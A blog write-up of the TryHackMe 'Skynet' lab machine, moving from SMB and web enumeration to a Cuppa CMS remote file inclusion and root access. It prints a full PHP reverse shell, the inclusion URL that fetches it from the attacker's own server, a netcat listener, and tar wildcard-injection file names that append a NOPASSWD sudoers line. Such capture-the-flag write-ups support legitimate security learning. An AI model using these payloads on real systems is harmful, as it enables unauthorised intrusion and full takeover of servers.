---
title: "Skynet Writeup THM"
description: "My writeup of the TryHackMe room [Skynet](https://tryhackme.com/room/skynet)"
date: 2023-12-28
image: https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - Privilege Escalation
    - SMB
    - Crontab
categories:
    - Room
    - Easy
---

The first step is to do a nmap scan:

```bash
sudo nmap -A <machine_ip>

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 09:06 EST
Nmap scan report for 10.10.34.11
Host is up (0.062s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES CAPA SASL UIDL PIPELINING TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: SASL-IR more ENABLE LOGINDISABLEDA0001 OK IDLE post-login listed capabilities IMAP4rev1 have ID Pre-login LITERAL+ LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

We can see that it has:

- SSH
- HTTP
- pop3
- netbios
- imap
- and samba open

The most interessing are ssh, http and samba.

The first thing that I am going to do is, enumerate samba, as sugested by the room.

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <machine_ip>

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 09:32 EST
Nmap scan report for 10.10.34.11
Host is up (0.060s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.34.11\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.34.11\anonymous:
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.34.11\milesdyson:
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.34.11\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-users:
|   SKYNET\milesdyson (RID: 1000)
|     Full name:
|     Description:
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
```

As we can see it has Anonymous open: \\10.10.34.11\anonymous:

So I am going to enter in that folder.

```bash
smb: \> ls
.                                   D        0  Thu Nov 26 11:04:00 2020
..                                  D        0  Tue Sep 17 03:20:17 2019
attention.txt                       N      163  Tue Sep 17 23:04:59 2019
logs                                D        0  Wed Sep 18 00:42:16 2019
```

Inside that folder we find one file and a directory, I am just going to download them.

```bash
cat attention.txt

A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

So, here we see Miles Dyson again, that tells everyone to change the passwords.

In the first log file instead we get a list of passwords, the newer is the one that we are searching for.

The other two are empty, but maybe there are other two accounts.

Now that we have an username and password I tried to connect to the smb share of Miles, but it didn’t go weel:

```bash
smbclient //10.10.34.11/milesdyson -U milesdyson

Password for [WORKGROUP\milesdyson]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

So I just went to the next phase, the web page.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png)

From the web page we only get this thing, but we could do a directory fuzzing for more results.

```bash
ffuf  -u http://10.10.34.11/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.34.11/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 69ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 68ms]
admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 56ms]
ai                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 57ms]
config                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 57ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 62ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 333ms]
squirrelmail            [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 56ms]
:: Progress: [20469/20469] :: Job [1/1] :: 298 req/sec :: Duration: [0:00:37] :: Errors: 0 ::
```

The one thing that we want to check is squirrel mail, where we are going to put our username and password that we found before.

By entering the mail server we see 3 emails, the first is the one interessing for now.

```bash
We have changed your smb password after system malfunction.
Password: <redacted>
```

So that’s why I couldn’t access his share.

Another thing that we get from this is that we have found the two other accounts, probably skynet is the admin and serenakogan is another user.

So we go back to samba.

```bash
smbclient //10.10.34.11/milesdyson -U milesdyson

Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019
```

And now we are in.

```bash
smbclient //10.10.34.11/milesdyson -U milesdyson

Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

                9204224 blocks of size 1024. 5654060 blocks available
```

As we can see his share is full of useless things, the only thing that is important is the notes folder, from there we can see that it has a txt file named important.txt

Getting that file will reveal to us a hidden directory inside the web page.

This directory doesn’t tell us much.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%201.png)

But one thing that we can do is to FUZZ this.

```bash
ffuf  -u http://10.10.34.11/<redacted>/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.34.11/<redacted>/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 59ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4154ms]
administrator           [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 58ms]
:: Progress: [20469/20469] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

And we got another directory, an administrator page.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%202.png)

After trying some password I decided to searcxh internet for exploits.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%203.png)

I came accross this, a remote file ionclusion vuln.

I tested it out and it works.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%204.png)

Unfortunately with this method we can’t also get the shadow.

So I tried another FLI listed in here:

`http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?`

For this to work, I first need to generate a reverse shell:

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'your_ip';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

start a python server `python -m http.server 8000`

then start a listener: `nc -lvnp 444`

now we go to this page:

`<machine_ip>/<redacted>/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.20.116:8000/php.php`

And we have our reverse shell.

```bash
nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.18.20.116] from (UNKNOWN) [10.10.34.11] 42912
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 09:39:18 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1459): Inappropriate ioctl for device
bash: no job control in this shell
www-data@skynet:/$
```

From here we can go to miles home directory and find the user flag.

Now we want to get the root flag.

after searching for a while, the only thing that seems interessing is this:

```bash
cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

There is a backup running all minutes, and it is using root privileges.

```bash
cat backup.sh

#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

This script is very simple, it just goes to the `/var/www/html` folder and archiving all of the data inside `/home/milesdyson/backups/backup.tgz *`

The thing is, that we can write inside the `/var/www/html` directory.

So we can use this GTFObin script:

**Shell**

It can be used to break out from restricted environments by spawning an interactive system shell.

- `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

What you have to do is run the following in the /var/www/html folder (which is being backed up).

```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
touch "/var/www/html/--checkpoint=1"
```

And after a minute we have root access just by using: `sudo su`
